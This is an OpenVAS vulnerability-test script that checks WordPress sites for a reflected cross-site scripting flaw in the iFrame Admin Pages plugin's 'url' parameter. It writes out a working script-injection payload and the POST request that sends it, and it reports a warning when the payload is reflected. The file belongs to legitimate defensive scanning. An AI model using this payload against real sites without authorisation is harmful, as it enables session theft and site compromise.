###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_iframe_admin_pages_plugin_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# WordPress iFrame Admin Pages Plugin 'url' Parameter XSS Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "WordPress iFrame Admin Pages Plugin version 0.1 and prior";
tag_insight = "The flaw is due to an improper validation of user supplied input to
  the 'url' parameter in '/wp-content/plugins/iframe-admin-pages/main_page.php',
  which allows attackers to execute arbitrary HTML and script code in a user's
  browser session in the context of an affected site.";
tag_solution = "No solution or patch is available as of 16th May, 2012. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://wordpress.org/extend/plugins/";
tag_summary = "This host is running WordPress with iFrame Admin Pages Plugin and
  is prone to cross site scripting vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802855";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_bugtraq_id(53522);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-05-16 15:26:57 +0530 (Wed, 16 May 2012)");
  script_name("WordPress iFrame Admin Pages Plugin 'url' Parameter XSS Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53522");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/75626");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/112701/wpiframeadminpages-xss.txt");

  script_description(desc);
  script_summary("Check if WordPress iFrame Admin Pages Plugin is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Variable Initialization
dir = "";
url = "";
port = 0;
ifReq = "";
ifRes = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Path of Vulnerable Page
url = dir + '/wp-content/plugins/iframe-admin-pages/main_page.php';

## Construct the POST data
postdata = 'url="><script>alert(document.cookie)</script>&newiframe=' +
           'new&servicerequest=new';

## Construct the POST request
ifReq = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent:  XSS-TEST\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postdata), "\r\n",
               "\r\n", postdata);

## Send attack and receive the response
ifRes = http_keepalive_send_recv(port:port, data: ifReq);

## Confirm exploit worked by checking the response
if(ifRes && ifRes =~ "HTTP/1\.[0-9]+ 200" &&
   ">iFrame" >< ifRes &&
   "><script>alert(document.cookie)</script>" >< ifRes)
{
  security_warning(port);
  exit(0);
}
